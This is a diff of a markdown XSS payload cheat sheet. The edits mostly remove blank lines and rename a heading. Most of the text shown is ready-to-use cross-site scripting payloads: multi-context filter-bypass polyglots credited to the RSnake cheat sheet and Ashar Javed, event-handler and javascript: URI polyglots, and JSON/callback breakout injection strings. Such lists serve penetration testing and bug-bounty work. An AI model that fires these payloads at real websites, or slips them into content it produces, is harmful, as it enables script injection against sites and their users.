@@ -9,7 +9,6 @@ XSS payload
 'Multi Context , filter bypass based polyglot payload
 Rsnake XSS Cheat Sheet
 
-
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
 alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
@@ -23,27 +22,18 @@ Multi-context; filter bypass based polyglot payload #2
 Ashar Javed
 
 https://github.com/jhaddix/tbhm/blob/master/05_XSS.md
-
-
-
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
 Payload 3
-
-
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-
-
-Polyglot #4
-
-
-    
+Polyglot 4
+ 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 jaVasCript:/*-/*`/*\`/*'/*"/*%0A%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -78,8 +68,6 @@ callback
 (more on the OWASP page)
 
 Common Injection strings
-
-
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 %22})))}catch(e){alert(document.domain);}//
 
@@ -88,8 +76,6 @@ Common Injection strings
 "a")(({type:"ready"}));}catch(e){alert(1)}//
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
 
 AUTOMATED SWF Scanner
 
